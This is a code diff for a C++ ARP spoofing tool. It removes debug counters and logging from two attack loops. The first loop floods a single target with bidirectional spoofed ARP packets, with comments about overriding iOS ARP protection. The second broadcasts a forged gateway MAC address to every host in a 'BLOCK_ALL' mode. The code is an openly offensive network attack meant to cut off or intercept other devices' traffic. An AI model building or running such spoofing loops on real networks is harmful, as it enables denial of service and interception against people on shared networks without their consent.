@@ -102,7 +102,6 @@ int main(int argc, char* argv[]) {
 
         // 3. Continuous bidirectional spoofing loop
         std::cout << "BLOCK_STARTED: " << target_ip << std::endl;
-        int count = 0;
         while (true) {
             // Send multiple ARP packets per iteration for iOS compatibility
             // iOS has ARP protection, needs packet flood to override cache
@@ -122,10 +121,6 @@ int main(int argc, char* argv[]) {
                 }
                 
                 usleep(50000); // 50ms between packets
-            }
-            
-            if (++count % 5 == 0) {
-                std::cout << "DEBUG: Sent " << (count * 2) << " spoofing packets..." << std::endl;
             }
             
             usleep(200000); // 200ms between iterations
@@ -168,16 +163,11 @@ int main(int argc, char* argv[]) {
 
         arp_init();
         std::cout << "BLOCK_ALL_STARTED" << std::endl;
-        int count = 0;
         while (true) {
             // Tell EVERYONE (Broadcast) we are the gateway
             // "Everybody, the MAC for Gateway is [OurMac]"
             if (!arp_send_packet(iface, gateway_ip, our_mac, "255.255.255.255", "ff:ff:ff:ff:ff:ff", false)) {
                 std::cerr << "ERROR: Failed to send broadcast spoof packet" << std::endl;
-            }
-
-            if (++count % 5 == 0) {
-                std::cout << "DEBUG: Sent " << count << " broadcast spoofing packets..." << std::endl;
             }
 
             usleep(300000); // 300ms - very aggressive for broadcast
